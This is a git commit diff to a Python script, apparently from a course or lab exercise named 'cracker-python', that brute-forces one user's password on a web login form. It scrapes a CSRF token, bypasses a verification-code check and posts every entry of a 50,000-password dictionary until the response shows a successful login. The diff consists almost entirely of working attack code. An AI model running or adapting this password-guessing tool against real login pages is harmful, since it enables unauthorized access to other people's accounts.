65e29c6a71011825c3b7bd9cb38334380a3a9159
Zero0one1 <arya_lee@qq.com>
2019-10-22 16:19:35 +0800

    根据字典文件爆破指定用户的口令

--- cracker-python/task1BrutalLogin.py
+++ cracker-python/task1BrutalLogin.py
@@ -1,13 +1,6 @@
 #coding=utf-8
 import sys
 import requests
-import re
-import base64
-import time
-import json
-import random
-import threading
-from selenium import webdriver
 from bs4 import BeautifulSoup
 
 UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0"
@@ -18,12 +11,11 @@ def GET():
     s=session.get(URL)
     soup=BeautifulSoup(s.content,"html.parser")
     csrf_token=soup.find(id='csrf_token')['value']
-    print(csrf_token)
-    print("get successfully!")
+    # print(csrf_token)
+    print("GET successfully")
     return csrf_token,session
 
 def POST(user,password,UA,token,session):
-        
         # what the verify code is does not matter, as long as 'verification'=='code'
         post_data = {}
         post_data['username'] = user
@@ -37,33 +29,36 @@ def POST(user,password,UA,token,session):
         "Referer": "%s"%URL,
         "Connection": "close"}
         resp = session.post(url=URL,data=post_data,headers=headers)
-        print("POST: "+user+"#"+password+" ")
+        print("POST: name:"+user+", password:"+password+" ")
         if resp.text.find('Login successfully')!=-1:
             print('*** find user:', user, 'with password:', password, '***')
+            return 1
+        else:
+            return 0
+            # print(resp.text)
 
-# TODO: burst the psw
+# brute the password of special user
+def brute(user,password):
+    csrf_token,session=GET()
+    return POST(user,password,UA,csrf_token,session)
+
 def main():
     tsk = []
-    user_list = []
-    f1 = open('dict.txt','r')
-    for i in f1.readlines():
-        password = i.strip()
-        for j in user_list:
-            user = j
-            
-            t = threading.Thread(target = brute,args = (user,password,UA))
-            tsk.append(t)
-    for t in tsk:
-        t.start()
-        t.join()#阻塞(0.1)
+    dictfile='top50000pwd'
+    user='TonyLin'
+    with open(dictfile,'r',encoding='utf-8') as f:
+        for line in f.readlines():
+            pwd=line.strip('\n')
+            ret=brute(user,pwd)
+            if ret==1:
+                break
 
 def DEBUG():
     user='TonyLin'
     password='123456'
-    csrf_token,session=GET()
-    POST(user,password,UA,csrf_token,session)
+    brute(user,password)
 
-_DEBUG=True
+_DEBUG=False
 
 if __name__ == '__main__':
     if _DEBUG:
